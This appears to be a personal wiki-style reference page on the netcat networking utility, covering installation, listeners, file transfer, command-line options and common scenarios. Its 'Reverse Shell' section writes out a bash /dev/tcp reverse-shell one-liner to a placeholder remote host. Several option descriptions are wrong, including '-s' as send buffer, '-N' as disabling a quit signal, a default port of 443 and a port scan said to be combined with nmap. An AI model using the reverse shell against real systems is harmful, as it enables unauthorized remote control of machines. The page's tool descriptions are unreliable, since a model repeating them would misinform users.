---
id:
type: index
created:
updated:
---

# Netcat (nc)

`netcat` (often abbreviated as `nc`) is a versatile networking shell utility that allows for the reading and writing of streams over Internet protocols. It is commonly used for network scanning, establishing remote connections, and file transfers.

## Installation

On Debian/Ubuntu:
```bash
sudo apt update
sudo apt install netcat-traditional
```

On RHEL/CentOS:
```bash
sudo dnf install netcat
```

## Basic Usage

### Listening for Connections
Accept incoming connections on a specific port:
```bash
# Start a listener on port 8080
nc -l -p 8080
```

### Connecting to Remote Host
Connect to a remote server and interact with it:
```bash
# Connect to hostname, listen for input until EOF
nc example.com
```

### Data Transfer

#### Reading Files (Client to Server)
```bash
nc <remote_host> <port> > <local_file>
```

#### Writing Files (Server to Client)
```bash
cat <local_file> | nc <remote_host> <port>
```

## Advanced Options

### `-v` Verbose
Enable verbose output to see connection status:
```bash
nc -v <host> <port>
```

### `--send-buffer` or `-s` Send Buffer
Set the size of the send buffer:
```bash
nc -s 64 <host> <port>
```

### `-N` or `--no-sigquit`
Disable signal that would quit the program:
```bash
nc -N <host> <port>
```

### `-p` Port
Specify the port for the server, otherwise defaults to 443:
```bash
nc -l -p 22 <server>  # Server accepts on port 22
```

### `-k` Keep Running
Keep listening even after a connection closes:
```bash
nc -k <host> <port>
```

## Common Scenarios

### Reverse Shell
```bash
bash -i >& /dev/tcp/<remote_host>/4445 0>&1
nc <remote_host> 4445
```

### Port Scanning (Combined with nmap)
```bash
nc -zv 192.168.1.0/24
```

## Security Considerations

- Always verify remote host before establishing connections
- Use `-k` flag only with trusted peers to prevent open ports
- For production use, consider more secure alternatives like SSH or TLS
